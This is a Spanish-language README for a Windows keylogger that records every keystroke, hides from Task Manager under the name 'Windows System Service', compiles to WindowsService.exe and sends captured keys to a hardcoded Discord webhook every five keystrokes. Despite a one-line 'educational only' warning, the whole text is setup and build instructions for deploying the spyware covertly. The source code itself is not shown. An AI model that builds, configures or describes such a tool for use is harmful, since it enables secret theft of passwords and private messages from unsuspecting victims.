# KEYLOGGER

**⚠️ ADVERTENCIA: Este software es solo para fines educativos. El uso de keyloggers sin autorización es ilegal.**

## Características

- Webhook hardcodeado en el código
- Se ejecuta automáticamente en segundo plano
- Se oculta del administrador de tareas
- Envía datos capturados al webhook cada 5 teclas
- Se puede compilar a ejecutable
- Funciona sin interfaz gráfica

## Configuración

### 1. Configurar el Webhook

Abre `main.py` y reemplaza la línea 12:

```python
self.webhook_url = "https://discord.com/api/webhooks/TU_WEBHOOK_AQUI"
```

Con tu webhook real:

```python
self.webhook_url = "https://discord.com/api/webhooks/1234567890/abcdefghijklmnopqrstuvwxyz"
```

### 2. Instalar Dependencias

```bash
pip install -r requirements.txt
```

## Uso

### Opción 1: Ejecutar como Script Python

```bash
python main.py
```

### Opción 2: Compilar a Ejecutable

1. **Compilar:**
```bash
build.bat
```

2. **El ejecutable estará en:** `dist\WindowsService.exe`

3. **Ejecutar el .exe** y funcionará automáticamente

## Funcionamiento

- **Ejecución automática**: Se inicia inmediatamente sin interfaz
- **Ocultación**: Se oculta del administrador de tareas como "Windows System Service"
- **Registro silencioso**: Captura todas las teclas sin mostrar nada
- **Envío automático**: Envía datos al webhook cada 5 teclas
- **Segundo plano**: Funciona completamente en segundo plano

## Características del Webhook

- Envía mensajes formateados con emojis
- Incluye timestamp de cada tecla
- Muestra estadísticas de captura
- Funciona completamente en silencio

## Notas Importantes

- Solo funciona en Windows
- Requiere permisos de administrador para algunas funciones
- El webhook debe estar configurado correctamente en el código
- Los datos se envían cada 5 teclas capturadas
- Se puede detener con ESC (si se detecta)
- El ejecutable se ejecuta automáticamente sin mostrar nada

## Estructura de Archivos

```
KEYLOGGER/
├── main.py              # Código principal (configurar webhook aquí)
├── requirements.txt     # Dependencias
├── build.bat           # Script de compilación
└── README.md           # Este archivo
``` 
